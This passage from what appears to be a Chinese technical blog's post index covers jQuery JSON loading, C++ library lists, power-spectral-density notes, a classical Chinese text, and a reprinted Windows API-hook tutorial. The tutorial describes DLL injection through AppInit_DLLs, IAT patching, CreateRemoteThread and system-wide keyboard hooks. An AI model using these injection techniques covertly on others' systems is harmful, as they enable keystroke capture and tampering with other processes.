$this.data(&#x27;danmu&#x27;, (data = new GesturePasswd(this, options))); if (action) data[action](arg); &#125;) &#125; $.fn.GesturePasswd = Plugin; $.fn.GesturePasswd.Constructor = GesturePasswd; &#125;)(jQuery); ※通过jquery的ajax请求本地的json文件方法 ajax 123456789101112131415161718192021$(function()&#123; $.ajax(&#123; //请求方式为get type:&quot;GET&quot;, //json文件位置 url:&quot;./data/shuju.json&quot;, //返回数据格式为json dataType: &quot;json&quot;, //请求成功完成后要执行的方法 success: function(data)&#123; //使用$.each方法遍历返回的数据date,插入到id为#result中 var str=&quot;&lt;ul&gt;&quot;; $.each(data.list,function(i,n)&#123; str+=&quot;&lt;li&gt;&quot;+n[&quot;item&quot;]+&quot;&lt;/li&gt;&quot;; &#125;) str+=&quot;&lt;/ul&gt;&quot;; $(&quot;#test&quot;).append(str); &#125; &#125;);&#125;); 还可以通过$.getJSON来获取本地json文件 1234567891011/* getJSON*/$(function()&#123; $.getJSON(&quot;./data/shuju.json&quot;,function(data)&#123; var str=&quot;&lt;ul&gt;&quot;; $.each(data.list,function(i,n)&#123; str+=&quot;&lt;li&gt;&quot;+n[&quot;item&quot;]+&quot;&lt;/li&gt;&quot;; &#125;) str+=&quot;&lt;/ul&gt;&quot;; $(&quot;#test&quot;).append(str); &#125;);&#125;);","tags":"js 专题 jquery"},{"title":"c++专题","url":"/20210220/c-zhuan-ti/","text":"C++ 资源大全 关于 C++ 框架、库和资源的一些汇总列表，内容包括：标准库、Web应用框架、人工智能、数据库、图片处理、机器学习、日志、代码分析等。 C++ reference Awesome C++ A curated list of awesome C++ (or C) frameworks, libraries, resources, and shiny things. Inspired by awesome-… stuff. Awesome Modern C++A collection of resources on modern C++.The goal is to collect a list of resources to help people learn about and leverage modern C++11 and beyond. awesome-cA curated list of C good stuff. This list contains only free software for code, and sellers who aren’t evil for physical resources. Awesome CA curated list of C good stuff. This list contains only open source code (as defined by the linked Open Source Definition), and sellers who aren’t evil for physical resources. C++ 资源大全中文版标准库、Web应用框架、人工智能、数据库、图片处理、机器学习、日志、代码分析等。 AwesomeCppC学习笔记和常见面试知识点，C11特性，包括智能指针、四种强制转换、function和bind、移动语义、完美转发、tuple、多态原理、虚表、友元函数、符号重载、函数指针、深浅拷贝、struct内存对齐、volatile以及union\\static等各种关键字的用法等等 ※不容错过的 13 个顶级 C++ 程序库 C++ 标准库 – 精华中的精华 一提到 C++ 标准库，马上就会想到 STL。作为 C++ 标准语言的一部分，C++ 标准库不仅是编程语言，更是标准的程序库资源，且由国际标准化组织（ISO）监督制定。点击链接，可以直接找到目前最新的 C++ 版本及其标准库。 FileSystem 库，则提供了对文件系统及其组件（如路径、目录和常规文件）执行操作的工具。在 C++ 14 中，这个库还只是试验性的产品，而到 C++ 17，则成为了标准库的一部分。准确地说，命名空间由 std::experimental::filesystem 变成了 std::filesystem。 使用标准库内的工具总是最好的，因为行为可以在不同平台得到广泛地定义，只要平台支持 C++。 那么，STL 呢？标准模板库是处理容器、迭代器和算法的标准库子集。STL 是一个通用库，帮助用现代高效算法管理数据集合。我认为 C++ 标准库，包括 STL，都是 C++ 程序员的日常必备。 Boost 当然，Boost 也必须在清单之内。我在上一节讨论了 FileSystem 库，其实，FileSystem 库是以 Boost FileSystem 库为基础建立的。在 C++ 标准库中，有许多其他的实例都使用了 Boost 库，这也充分证明了 Boost 的实力。Boost 是一个免费、开源、经过专家评审的库，受 Boost 软件协议管理，可以较为自由地使用。Boost 在行业口碑很好，由多个开发师编写，其中包含支持线性代数、伪随机数生成、多线程、图像处理、正则表达式、字符串和文本处理和单元测试等多种代码包。但其缺陷在于，Boost 本身庞大而复杂，使用门槛较高。另外，链接到 Boost 会导致可执行文件的大小增加。 Poco POCO C++ 库，兼具易用性和性能优越的特点，是一个强大的跨平台 C++库。Poco 代表便携式组件，提供一些特定的功能，如：构建以网络为中心，或者以网络为基础的便携式应用程序。Poco 库具有模块化的特点，因此非常适合嵌入式开发（在物联网、汽车、安全、工业自动化等行业）。在许可协议方面，Poco 有一个开源版本，由 Boost software license 1.0 授权。另外还有一个订阅的专业版本，提供商业源代码许可。你可以从 GitHub 下载 POCO。 OpenSSL OpenSSL 是网络安全、加密的利刃。其 libcrypto 组件中包含了通用的高强度加密例程，libssl 组件可实现所有 TLS 协议。OpenSSL 是一个 C 语言库，但它在加密应用程序中非常重要，因此我将它包括在这里。一般来说，程序库的一个小小漏洞很少会被注意，也更不可能有它自己的专属网页。但是，OpenSSL 的“滴血之心”（Heartbleed Bug）漏洞造成的恐慌几乎席卷全球，具体信息，可以点击链接阅读。 FFmpeg 如果你需要任何处理音频和视频，你就会用到 FFmpeg。除了提供 ffmpeg 这个命令行可执行文件外，该项目还包括一组高质量库，用于音频/视频编解码器的编码和解码、多媒体容器格式的解复用器和多路复用器、媒体文件管理器、图像缩放和颜色空间格式转换操作等。FFmpeg 是一个免费的开源库，在 GNU LGPL V2.1 许可下发布。 SQLite SQLite 是一种 C 语言库，并实现了一个功能齐全、自包含、与 ACID 兼容的 SQ L数据库引擎。SQLite 是世界上使用最多的数据库引擎，其重要性不言而喻。SQLite 的源代码是公开的，大家都可以免费使用。SQLite 的使用也很特别，通常通过 Amalgamation 这个源代码文件编译到客户机应用程序中。 Dear ImGui Dear ImGui 是一个出色的图形用户界面 C++ 库，使用 Dear ImGui 的应用程序数据可以证明其性能优越。Dear ImGui 兼具快速、可移植、兼容且独立的特点。其设计目标是简单和高效，因此尤其适合游戏引擎、沉浸式 3D 应用程序、全屏和嵌入式应用程序。Dear ImGui 是开源的 C++ 库，提供免费的许可，可通过链接下载。 现代 C++ JSON 库 现代 C++ JSON 库，是可在 C++ 中使用的 JSON 单个头文件，这也是我用过的 JSON 最好的程序库。语法简单直接，且使用 MIT 许可。因为这是一个只有头文件的库，并且只是一个 json.hpp 头文件，因此，集成相当轻便、简单。 GoogleTest 很多 C++ 程序员更喜欢用 GoogleTest 进行单元测试。GoogleTest 是一个开源的、维护良好的 xUnit 测试框架和C++库，其中包括一个模拟框架，非常适合执行左移战略的企业。 Eclipse Mosquitto 如果你需要在 C++ 中使用 MQTT 协议，你就会用到 Eclipse Mosquitto。MQTT 是一种轻量、高效的协议，需要的资源极少，因此适合像小型微控制器这样的低功耗设备。MQTT 的体系结构可以是发布或订阅，其中，MQTT 客户机与 MQTT 代理直接对话。Eclipse Mosquitto 库为发布者和订阅者提供了实用程序，具体资源可从链接下载。 OpenCV 关于 Open CV，我只有赞美之词（可参考之前的博客《CMake、OpenCV 和单元测试》）。用于图像处理和计算机视觉的 C++ 库不计其数，但都比不上 OpenCV 的通用性。OpenCV 具有实时的计算机视觉、机器学习和用于人脸识别、目标检测和 3D 模型提取的深度学习库。OpenCV 库成熟、完善，拥有 Apache 开放源码许可。 oneAPI Threading Building Blocks Threading Building Block 库现在是开源的，并更名为oneAPI Threading Building Blocks (oneTBB)。这个程序库可帮助并行 C++ 程序，充分利用多核处理器，这些处理器便携、易于组合且具有发展潜力。OneTBB 也提供 Apache 开放源码许可，具体信息可查看链接。 Tensorflow 除非你在过去五年与世隔绝，否则你肯定听说过 Tensorflow。这是一个用 C++ 编写的机器学习框架，包括杰出的 C++ 库资源，可用于开发机器学习模型中的许多常见任务。Tensorflow 最初是由 Google Brain 团队的研究人员开发的，他们当时负责研究机器学习和深层神经网络问题。Tensorflow 有一个开放源码 Apache 2.0 许可。 ※c语言源代码 http://www.hotscripts.com/category/c-cpp/scripts-programs/ Hotscripts --提供数以百计的C和C++脚本和程序。 http://www.daniweb.com/ --DANIWEB提供的实用代码段 。 http://www.programmersheaven.com/ --programmersheaven.com上的C编程资源。 http://www.cprogramming.com/cgi-bin/source/source.cgi --C和C + +编程资源。 http://www.codecogs.com/ --CodeCogs是一项协作的开放源码库，C/C++的数值方面的组件。 http://www.google.com/codesearch?q=programming++lang:c&amp;cs_r=lang:c --谷歌代码的C源代码。 http://www.cis.temple.edu/~ingargio/cis71/code/ --为学生提供的一个简单的C语言程序的列表。 http://www.codeproject.com/?cat=2 --codeproject提供的C/C++资源代码项目。 http://www.thefreecountry.com/sourcecode/cpp.shtml --以下是一些C和C++库的DLL，VCLs，源代码，元件，模块，应用程序框架，类库，源代码片段等，你可以在您的项目中使用而不需要支付费用和版税。 http://people.sc.fsu.edu/~burkardt/cpp_src/cpp_src.html --这是一个全面的关于C++的345个源代码清单。 http://www.cplusplus.com/ --C++写的通用控制台程序和Windows程序代码清单。 http://users.cs.fiu.edu/~weiss/dsaa_c++/code/ --C++语言数据结构与算法分析（第二版）的源代码。 http://www.moshier.net/ 天文学和数值软件源代码 http://cplus.about.com/od/cgames/C_Games_with_Source_Code.htm --游戏有关的C++源代码。 http://www.mathtools.net/C_C__/Utilities/index.html --C/C++工具。 http://www.programmerworld.net/resources/c_library.htm --免费C++源代码和其它有用的工具。 http://www.robertnz.net/ --这是一个收集了数C/C++网站链接列表的网页。 http://www.josuttis.com/libbook/examples.html --在这里，你可以看到并下载所有的本书的C++标准库例子 。 http://www.einet.net/directory/65892/Developers.htm --C程序 http://www.daniweb.com/code/cplusplus.html --实用代码段。 http://www.programmersheaven.com/ --C++编程资源，programmersheaven.com http://www.google.com/codesearch?hl=en&amp;lr=&amp;q=programming --谷歌代码搜索-C++编程语言 http://cplus.about.com/od/codelibrary/Code_Library_for_C_C_and_C.htm --代码库C、C + +和C＃。 http://www.c.happycodings.com/ --Visual Basic、PHP、ASP技术、C、C++大全。 http://www.java2s.com/Code/Cpp/CatalogCpp.htm --C++源代码。 http://www.josuttis.com/libbook/examples.html --C++标准库-教程和参考资料。","tags":"专题 code-snippets c/c++"},{"title":"PSD的单位及计算方法","url":"/20191218/psd-de-dan-wei-ji-ji-suan-fang-fa/","text":"功率谱密度（PSD）的国际单位 功率谱密度（PSD），单位为：unit^2/Hz代表单位频率上信号的能量，所以是密度谱，幅值代表频段内的有效值平方。 如果是加速度功率谱密度，加速度的单位是m/s^2, 那么，加速度功率谱密度的单位就是(m/s2)2/Hz, 而Hz的单位是1/s,经过换算得到加速度功率谱密度的单位是m2/s3. 同理，如果是位移功率谱密度，它的单位就是m^2s, 如果是弯矩功率谱密度，单位就是(Nm)^2s 位移功率谱——m^2s 速度功率谱——m^2/s 加速度功率谱——m2/s3 PSD计算时的步骤为 1 对每一分段数据进行FFT变换，并求它的幅值谱 2 对幅值谱进行平方 3 将双边谱转化为单边谱？？ 4 除以频率分辨率delt(f)=1/T=fs/nfft 举个例子：幅值为1，频率为16Hz的正弦信号，使用1024Hz采样，2048点进行功率谱密度计算，频率分辨率为1024/2048=0.5Hz，求出的功率谱单边谱在第32根谱线处的值为1，解释为：信号FFT变换后得到的双边谱，幅值分别为0.5，平方后为0.25，转化为单边乘2为0.5，再除以频率分辨率为1。将1乘以0.5（频率分辨率），正好为该信号有效值0.707的平方。 因为实数信号的双边幅值谱都是对称的，双边谱中包含负频率，在物理系统中是没有的，因此用单边谱就够了，这时候把负频率成分附加到相应的正频率成分，也就是在双边谱的基础上乘以２。 另参考：matlab不同方法计算的功率谱密度幅值分析： pwelch的幅值是单边谱，幅值的量纲是EU^2/Hz。 PSD是双边谱，幅值的量纲是EU^2，大小是实际功率谱密度的fs/2倍（fs是采样频率）。 即：x(n)是一离散数据序列，采样频率为fs，fft点数为N。 则Pwelch=2*abs(fft(x)).^2./fs./N Psd=abs(fft(x)).^2./N 至此，明白了为什么ADAMS和DASP中计算出来的值差100倍的原因了！ 因为在ADAMS中的采样频率fs=3000/15=200Hz,所以，可以看出ADAMS中计算出来的应该是PSD，也就是双边功率谱密度“ ADAMS/PostProcessor creates a one-sided power spectral density. Therefore, the scaling it uses is: ” ADAMS帮助文件里为什么说是单边谱啊？不管那么多了，反正在ADAMS中计算得到的结果/采样频率的一般才是DASP中的幅值（Pwlch）。 ref: https://www.cnblogs.com/xpvincent/p/9341380.html","tags":"信号处理"},{"title":"论六家要指","url":"/20191203/lun-liu-jia-yao-zhi/","text":"太史公学天官於唐都，受易於杨何，习道论於黄子。太史公仕於建元元封之间，愍学者之不达其意而师悖，乃论六家之要指曰 易大传：“天下一致而百虑，同归而殊涂。”夫阴阳、儒、墨、名、法、道德，此务为治者也，直所从言之异路，有省不省耳。尝窃观阴阳之术，大祥而众忌讳，使人拘而多所畏；然其序四时之大顺，不可失也。 儒者博而寡要，劳而少功，是以其事难尽从；然其序君臣父子之礼，列夫妇长幼之别，不可易也。 墨者俭而难遵，是以其事不可遍循；然其彊本节用，不可废也。 法家严而少恩；然其正君臣上下之分，不可改矣。 名家使人俭而善失真；然其正名实，不可不察也。 道家使人精神专一，动合无形，赡足万物。其为术也，因阴阳之大顺，采儒墨之善，撮名法之要，与时迁移，应物变化，立俗施事，无所不宜，指约而易操，事少而功多。 儒者则不然。以为人主天下之仪表也，主倡而臣和，主先而臣随。如此则主劳而臣逸。至於大道之要，去健羡，绌聪明，释此而任术。夫神大用则竭，形大劳则敝。形神骚动，欲与天地长久，非所闻也。夫阴阳四时、八位、十二度、二十四节各有教令，顺之者昌，逆之者不死则亡，未必然也，故曰“使人拘而多畏”。夫春生夏长，秋收冬藏，此天道之大经也，弗顺则无以为天下纲纪，故曰“四时之大顺，不可失也”。夫儒者以六蓺为法。六蓺经传以千万数，累世不能通其学，当年不能究其礼，故曰“博而寡要，劳而少功”。若夫列君臣父子之礼，序夫妇长幼之别，虽百家弗能易也。 墨者亦尚尧舜道，言其德行曰：“堂高三尺，土阶三等，茅茨不翦，采椽不刮。食土簋，啜土刑，粝粱之食，藜霍之羹。夏日葛衣，冬日鹿裘。”其送死，桐棺三寸，举音不尽其哀。教丧礼，必以此为万民之率。使天下法若此，则尊卑无别也。夫世异时移，事业不必同，故曰“俭而难遵”。要曰彊本节用，则人给家足之道也。此墨子之所长，虽百家弗能废也。 法家不别亲疏，不殊贵贱，一断於法，则亲亲尊尊之恩绝矣。可以行一时之计，而不可长用也，故曰“严而少恩”。若尊主卑臣，明分职不得相逾越，虽百家弗能改也。 名家苛察缴绕，使人不得反其意，专决於名而失人情，故曰“使人俭而善失真”。若夫控名责实，参伍不失，此不可不察也。 道家无为，又曰无不为，其实易行，其辞难知。其术以虚无为本，以因循为用。无成埶，无常形，故能究万物之情。不为物先，不为物后，故能为万物主。有法无法，因时为业；有度无度，因物与合。故曰“圣人不朽，时变是守。虚者道之常也，因者君之纲”也。群臣并至，使各自明也。其实中其声者谓之端，实不中其声者谓之窾。窾言不听，奸乃不生，贤不肖自分，白黑乃形。在所欲用耳，何事不成。乃合大道，混混冥冥。光燿天下，复反无名。凡人所生者神也，所讬者形也。神大用则竭，形大劳则敝，形神离则死。死者不可复生，离者不可复反，故圣人重之。由是观之，神者生之本也，形者生之具也。不先定其神形，而曰“我有以治天下”，何由哉？","tags":"国学"},{"title":"Hook_Windows_NT","url":"/20191203/hook-windows-nt/","text":"Reprint from https://blog.csdn.net/WinsenJiansbomber/article/details/16891189 Hook API 2013年11月16日功能追溯 Windows编程的最简单的程序结构，只需要一个消息环。以下展示一个基本的Win32程序，它在开发执行时，会播放Windows 7启动时的使用的音响。#pragma 是VC平台的专用指令，使用它来替代手动设置工程属性，免去手动添加链接所需的LIB库。和普通控制台程序 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081#pragma comment(lib,&quot;winmm.lib&quot;)#include &lt;windows.h&gt;#include &lt;string.h&gt;using namespace std;static TCHAR szTitle[] = TEXT(&quot;GUI App&quot;);static TCHAR szSound[] = TEXT( &quot;c:\\\\windows\\\\media\\\\Windows Logon Sound.wav&quot; );HWND hWin;HINSTANCE hAPP;LRESULT CALLBACK circle( HWND, UINT, WPARAM, LPARAM );int WINAPI WinMain(HINSTANCE hApp, HINSTANCE hPre, LPSTR lpLine, int iCmd )&#123;MSG msg;WNDCLASS winClass;hAPP = hApp;winClass.style = CS_HREDRAW | CS_VREDRAW;winClass.lpfnWndProc = circle;winClass.hInstance= hApp;winClass.hIcon= LoadIcon( NULL, IDI_APPLICATION );winClass.hCursor= LoadCursor( NULL,IDC_CROSS );winClass.hbrBackground = (HBRUSH) GetStockObject( WHITE_BRUSH );winClass.lpszClassName = szTitle;winClass.lpszMenuName = NULL;winClass.cbClsExtra = 0;winClass.cbWndExtra = 0;if( !RegisterClass( &amp;winClass ) )&#123;MessageBox( NULL, TEXT(&quot;I need a Window!&quot;), szTitle, MB_ICONERROR );return 0;&#125;hWin = CreateWindow(szTitle, szTitle, //window class and captionWS_OVERLAPPEDWINDOW,CW_USEDEFAULT, CW_USEDEFAULT, // position x, yCW_USEDEFAULT, CW_USEDEFAULT, // size width, heightNULL, // parent windows handleNULL, // menu handlehApp,NULL); //creation parametersShowWindow( hWin, iCmd );UpdateWindow( hWin );while(GetMessage( &amp;msg, NULL, 0, 0 ) )&#123;TranslateMessage( &amp;msg );DispatchMessage( &amp;msg );&#125;return msg.wParam;&#125;LRESULT CALLBACK circle( HWND hWin, UINT iMsg, WPARAM wp, LPARAM lp )&#123;HDC hdc ;PAINTSTRUCT ps ;RECTrect ;switch( iMsg )&#123;case WM_CREATE:PlaySound( szSound, NULL, SND_FILENAME | SND_ASYNC );return 0;case WM_DESTROY:PostQuitMessage(0);return 0;case WM_PAINT:hdc = BeginPaint( hWin, &amp;ps);GetClientRect( hWin, &amp;rect );string text = &quot;Appication API HOOK&quot;;DrawText( hdc, text.c_str(), -1, &amp;rect, DT_SINGLELINE | DT_CENTER | DT_VCENTER );EndPaint( hWin, &amp;ps);return 0;&#125;return DefWindowProc( hWin, iMsg, wp, lp);&#125; 上面的程序结构和普通的DOS程序大体相同，只是加入了Windows平台的各种对象。为了新建一个GUI界面，首先设置了一个窗口类winClass，然后通过RegisterClass来注册到系统内，最后通过CreateWindow完成窗口的创建并用ShowWindow将其显示出来程序的结束同样是以WinMain的结束而完成的。不同的地方就在while循环，这个就是Windows系统特有的消息环。Windows通过消息机制来管理着系统设备的各种事件，如鼠标移动了，键盘被按下了，网络连接上了，或者是停电了等等。每一个事件有伴随着消息的传递，每条消息按先后缓急顺序被存储到一个称为消息队列Queue的地方。用户程序在消息环调用GetMessage方法时，就会进入一个不消耗CUP的等待状态，Windows在消息队列中发现一个属于当前用户程序的消息时，就会发送给用户程序，这样GetMessage就取得消息并返回到用户程序的消息环。这时最重要的事情就是对消息进行向应，这就是Windows编程要做的事。在前面，创建窗口时，给GreateWindow传入了一个窗口类，这个类的lpfnWndProc成员设置了一个引用circle的函数指针，这就是程序用来响应消息的方法，称为窗口过程。当消息环中调用DispatchMessage方法时，就会将消息传递给窗口过程进行处理。而在窗口过程中，将对不同的消息进行选择性处理，如程序完成初始化时的WM_CREATE消息，程序将播放一段乐音来响应。当用户通过鼠标点击窗口右上角的关闭按钮时，将产生一个WM_DESTORY消息，这就是一个关闭程序的意图。窗口过程在接收到这个关闭程序的消息时，就以调用PostQuitMesage来响应，它就是用来告知系统，程序需要关闭，不需要再做处理其它消息了。然后系统给消息环发送一个空消息，以使用while终止循环，最后WinMain即，程序结束。 注意，和PostQuitMessage相似的PostMessage可以用来向程序发送任意消息，它只负责将消息放到消息队列中，然后直接返回，相应的SendMessage要等到受到消息处理的返回码后才继续。 WM_PAINT是Windows窗口系统中一条重要的消息，应用程序通过处理该消息实现在窗口上的绘制工作。系统会在多个不同的时机发送WM_PAINT消息：当第一次创建一个窗口时，当改变窗口的大小时，当把窗口从另一个窗口背后移出时，当最大化或最小化窗口时，等等，这些动作都是由系统管理的，应用只是被动地接收该消息，在消息处理函数中进行绘制操作。大多数的时候应用也需要能够主动引发窗口中的绘制操作，比如当窗口显示的数据改变的时候，这一般是通过InvalidateRect和InvalidateRgn函数来完成的，前者把指定的区域加到窗口的待更新区域Update Region中，当应用的消息队列没有其他消息且待更新区域不为空时，系统就会自动产生WM_PAINT消息。待更新区域是用一个RECT结构表示的，如下定义： 123456typedef struct _RECT &#123; LONG left; // 窗口左边开始计算的像素位置 LONG top; // 窗口的顶部计算的像素位置 LONG right; LONG bottom;&#125; RECT, *PRECT; 系统为什么不在调用Invalidate时发送WM_PAINT消息呢？又为什么非要等应用消息队列为空时才发送WM_PAINT消息呢？这是因为系统把在窗口中的绘制操作当作一种低优先级的操作，于是尽可能地推后做。待更新区域区域会被累加起来，然后在一个WM_PAINT消息中一次得到更新，不仅能避免多次重复地更新同一区域，也优化了应用的更新操作。这种通过InvalidateRect和InvalidateRgn来使窗口区域无效，依赖于系统在合适的时机发送WM_PAINT消息的机制实际上是一种异步工作方式，也就是说，在无效化窗口区域和发送WM_PAINT消息之间是有延迟的；有时候这种延迟并不是我们希望的，这时我们当然可以在无效化窗口区域后利用SendMessage发送一条WM_PAINT消息来强制立即重画，但不如使用Windows GDI API：UpdateWindow和RedrawWindow或者使用WM_PRINT 、WM_PRINTCLIENT消息。 BeginPaint和WM_PAINT消息紧密相关。试一试在WM_PAINT处理函数中不写BeginPaint会怎样？程序会像进入了一个死循环一样达到惊人的CPU占用率，因为程序总有处理不完的WM_PAINT消息。其实BeginPaint的一个作用就是把待更新区域清空。BeginPaint和WM_ERASEBKGND消息也有关系。当窗口的待更新区域被标志为需要擦除背景时，BeginPaint会发送WM_ERASEBKGND消息来重画背景，同时在其返回信息里有一个标志表明窗口背景是否被重画过。当我们用InvalidateRect和InvalidateRgn来把指定区域加到待更新区域中时，可以设置该区域是否需要被擦除背景，这样下一个BeginPaint就知道是否需要发送WM_ERASEBKGND消息了。 要注意的是，BeginPaint只能在WM_PAINT处理函数中使用，在其它消息下无法实现窗口重绘功能。例如可以使用以下方法来产生一个待更新区，以强制刷新窗口。 1234RECT rect;GetClientRect( hWin, &amp;rect );InvalidateRect( hWin, &amp;rect, TRUE);UpdateWindow( hWin ); Windows程序就是这样一个基本的工作过程，然而，从DOS开始，程序开发就有个传统：程序需求对系统功能的监视和响应以实现程序的功能。这也是程序开发的基本需求，Windows 3.x的时代HOOK已经普遍应用。HOOK根本上来讲就是一处提供给开发者嵌入自定义例程以实现程序功能的场所。目前普遍将HOOK翻译为钩子的做法其实不太恰当，如果按照我在做Wordpress二次开发的经验，我更愿意将HOOK称作过滤器 Filter，从本质上讲Windows的HOOK和Wordpress的Filter是一致的。它们所起的作用就像是水管中间接上的一个过滤器，把某些东西过滤出来。事实上，1993年Kyle Marsh在MSDN上发表过一篇文章Win32 Hooks，里就是将钩子回调过程为过滤器函数，这篇文章可以在MSDN的技术文章栏目中找到。 实现程序功能代码嵌入的方法有各种形式，如下： 使用注册表注入，将程序注册到：HKLM/Software/Microsoft/Windows NT/CurrentVersion/Windows/AppInit_DLLs。这AppInit_DLLs这个键记录了一个或一组逗号分隔的DLL文件，当一个使用USER32.DLL的程序载入时，就会透过LoadLibrary()API依次加载AppInit_DLLs指定的链接库。这种方法只在NT架构系统且2K+版本上才有效。使用API注入，通过SetWindowsHookEx()来注册HOOK处理程序，使用CallNextHookEx() 来保持钩子链正常工作，退出时，使用UnhookWindowsHookEx()卸载钩子。通过修改PE文件注入，PE程序文件中有一个导入地址表IAT Import Address Table，它记录了程序要调用的外部函数的地址，改PE文件的IAT，使之指向自己的代码，这样EXE/DLL在调用系统API的时候便会调用你自己的函数。要注意，Windows API均有两个版本：Ansi和Unicode。例如获取程序标题的GetWindowTextAPI实际上只是一个宏，根据编译条件UNICODE来决定是调用GetWindowTextA还是GetWindowTextW。在NT系统下所有ANSI版本API会转换成UNICODE版本。通过遥距线程注入，使用CreateRemoteThread()方法可以创建一个线程，将要注入的程序透过LPTHREAD_START_ROUTINE参数传递给创建的线程，但是程序要先使用ThreadProc()API包装。这种方法是Jeffrey Ritcher提出来的，他写的文档也很完善，不过也只在NT架构系统且2K+版本上才有效。透过BHO插件注入，BHO是Browser Helper Objects，只在IE浏览器中使用。IE运行时会加载所有实现IObjectWithSite接口的COM组件。通过Office插件注入，和BHO方式相似，使用范围限制在Office内。 本文主要涉及API注入、PE文件注入及遥距线程注入。 API钩子程序结构 钩子，按习惯，大伙都叫它为钩了。在伴随Windows系统的发展中，钩子也发展出好多的分类，有系统层次的，有应用程序层次的，有核心层次的，有处理键盘消息的，有处理系统日志的，有监视API调用的，各式各样。对于一个钩子程序，按上面水管过滤的理解，首先就需要安装一个钩子，主钩子在系统中起作用；然后程序按功能逻辑进行处理，这需要一个钩子回调函数hook procedure；完了，程序要退出，就要清场，把钩子回收。 而每条水管可以安装多个不同的过滤器，同理钩子不也可以有多个，因此组成了一条链，系统将按注册顺序来调用。先调用线程钩子，然后调用系统钩子，后注册的先调用。 对于用户层次的钩子，只需要一个可以安装和回收钩子的程序就可以了，连带程序功能都在一个程序内实现。当钩子需要处理Windows内核消息时，就需要钩子运行于内核模式，这时就需要可以开发内核程序的DDK，它才是用来开发内核应用的，像驱动程序这类一样，而且必需将钩子程序编译到DLL程序中。只Win16程序才允许在程序内容注册一个系统钩子。先来看看SetWindowsHookEx原型： 123456HHOOK SetWindowsHookEx( int idHook,// hook type HOOKPROC lpfn, // hook procedure HINSTANCE hMod,// handle to application instance DWORD dwThreadId // thread identifier); hMod 指定钩子回调函数所在DLL的实例句柄。如果安装的是局部钩子的话，由于局部钩子的回调函数并不需要放在动态链接库中，这时这个参数就使用NULL。 dwThreadID是安装钩子后想监控的线程的ID号。该参数可以决定钩子是线程钩子局部范围的还是系统钩子全局范围。如果参数指定的是自己进程中的某个线程ID号，那么该钩子是一个局部钩子；如果指定的线程ID是另一个进程中某个线程的ID，那么安装的钩子是一个局部的远程钩子；如果想要安装系统范围的全局钩子的话，可以将这个参数指定为NULL，这样钩子就会被解释成系统范围的，可以用来监控所有的进程及它们的线程。 由于32-bit钩子不能注入到64-bit的进程，反之亦然，在x64平台上，需要准备x64版本的钩子程序，才能正常得到系统支持。使用SetWindowsHookEx注册钩子时，如果回NULL，则表示注册失败，可以通过GetLastError()获取错误代码：返回代码 含义 ERROR_INVALID_HOOK_FILTER 钩子代码无效。 ERROR_INVALID_FILTER_PROC 钩子函数无效。 ERROR_HOOK_NEEDS_HMOD 注册系统钩子使用了空hInstance参数，或者注册线程钩子的线程不存在。 ERROR_GLOBAL_ONLY_HOOK 以系统钩子方式注册了线程钩子。 ERROR_INVALID_PARAMETER 线程ID无效。 ERROR_JOURNAL_HOOK_SET JOURNAL钩子已经注册。 ERROR_MOD_NOT_FOUND hInstance参数不是指向一个库。简而言之就是在模块列表中定位到不到指定模块。其它值 出于安全，不允许或系统内存不足。 下表展示了WINUSER.H定义的一些钩子的类型：钩子名称 作用层次 监视消息的类型和时机 WH_CALLWNDPROC 线程、系统 应用于SendMessage函数调用时。 WH_CALLWNDPROCRET 线程、系统 应用于SendMessage函数调用后。 WH_CBT 线程、系统 当基于计算机的训练（CBT）事件发生时调用钩子函数 WH_DEBUG 线程、系统 在系统调用其他钩子函数前执行的钩子，当然是除了WH_DEBUG了，不然会循环。 WH_FOREGROUNDIDLE 系统 系统空闲钩子，当系统空闲的时候调用钩子函数，这样就可以在这里安排一些优先级很低的任务 WH_GETMESSAGE 线程、系统 应用于GetMessage或PeekMessage函数执行后。 WH_HARDWARE 线程、系统 每当调用GetMessage或PeekMessage函数时，如果从消息队列中得到的是非鼠标和键盘消息，则调用钩子函数 WH_JOURNALRECORD 系统 日志记录钩子，用来记录发送给系统消息队列的所有消息 WH_JOURNALPLAYBACK 系统 日志回放钩子，用来回放日志记录钩子记录的系统事件 WH_KEYBOARD 线程、系统 每当调用GetMessage或PeekMessage函数时，如果从消息队列中得到的是WM_KEYUP或WM_KEYDOWN消息，则调用钩子函数 WH_KEYBOARD_LL 系统 像Ctrl+alt+del 系统会先处理掉，WH_KEYBOARD没法截获，而WH_KEYBOARD_LL可以，但很容易引起挂起之类的问题，不过操作系统通过LowLevelHooksTimeout限时操作，超时就直接被忽略。 WH_MOUSE 线程、系统 每当调用GetMessage或PeekMessage函数时，如果从消息队列中得到的是鼠标消息，则调用钩子函数 WH_MOUSE_LL 系统 截获整个系统的鼠标事件消息。 WH_MSGFILTER 线程、系统 应用于用户程序对对话框、菜单和滚动条的消息，先于程序行为。 WH_SYSMSGFILTER 系统 同WH_MSGFILTER，应用于系统范围，影响更大。 WH_SHELL 线程、系统 当Windows shell程序准备接收一些通知事件前调用钩子函数，如shell被激活和重画等 日志记录钩子和日志回放钩子可以放在安装钩子的程序中，并不需要单独放在一个动态链接库中，因为它们是由Windows系统调用的钩子。程序内的线程级别钩子 在前面熟悉了Win32程序的基本结构和消息环的作用，在此基础上进行应用应用程序级别的钩子开发相对会比较容易入手。为了直观地显示注册钩子不成功的原因，下面使用FormatMessage增加了一个显示错误信息的方法，此方法通过查询GetLastError返回的错误代码返回文字版本的信息，然后通过对话框显示出来。 123456789101112131415void ShowErrorInfo(int Error)&#123;LPVOID lpMsgBuf;FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER |FORMAT_MESSAGE_FROM_SYSTEM |FORMAT_MESSAGE_IGNORE_INSERTS,NULL,Error,MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), // Default language(LPTSTR) &amp;lpMsgBuf,0,NULL);MessageBox( NULL, (LPCTSTR)lpMsgBuf, &quot;Error&quot;, MB_OK | MB_ICONINFORMATION );&#125; 按照前面对钩子应用的基本结构，这里要添加注册钩子HookStart和清除钩子HookDown的函数，以及钩子过程FilterFunc。现在就来实现最简单的当前程序级别的钩子，将文本最开始给出的Win32例子的窗口过程稍为修改一下，再添加上钩子功能得以下修改过的部分： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152UINT COUNT;HHOOK MyHook;LRESULT CALLBACK FilterFunc( int nCode, WORD wp, DWORD lp) &#123;stringstream ss;char text[MAXBYTE];ss &lt;&lt; szTitle &lt;&lt; &quot; - &quot; &lt;&lt; ++COUNT &lt;&lt; std::hex &lt;&lt; 